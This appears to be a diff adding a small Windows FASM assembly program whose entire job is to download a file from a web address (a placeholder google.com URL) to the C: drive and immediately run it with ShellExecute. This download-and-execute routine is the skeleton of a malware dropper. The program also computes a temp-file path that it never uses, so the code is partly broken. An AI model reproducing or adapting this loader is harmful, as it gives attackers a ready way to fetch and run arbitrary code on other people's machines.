@@ -1,0 +1,29 @@
+include '...\INCLUDE\win32ax.inc'
+entry main
+
+proc main
+locals
+    name  db 'a.txt',0
+    temp  dd ?
+endl
+    invoke LocalAlloc, LPTR, MAX_PATH
+    mov [temp], eax
+    invoke GetTempPath, MAX_PATH, [temp]
+    invoke lstrcat,[temp],addr name
+    invoke lstrcpy,addr name,[temp]
+    invoke URLDownloadToFile,NULL,'http://google.com/a.txt','C:\downloaded.txt',NULL,NULL
+    invoke ShellExecute,0,0,'C:\downloaded.txt',0,0,SW_SHOW
+    invoke ExitProcess,0
+endp
+
+data import
+
+ library kernel32,'KERNEL32.DLL',\
+         shell32, 'SHELL32.DLL',\
+         urlmon32, 'URLMON.DLL'
+
+ include '...\INCLUDE\API\kernel32.inc'
+ include '...\INCLUDE\API\shell32.inc'
+ import urlmon32, URLDownloadToFile, 'URLDownloadToFileA'
+
+end data
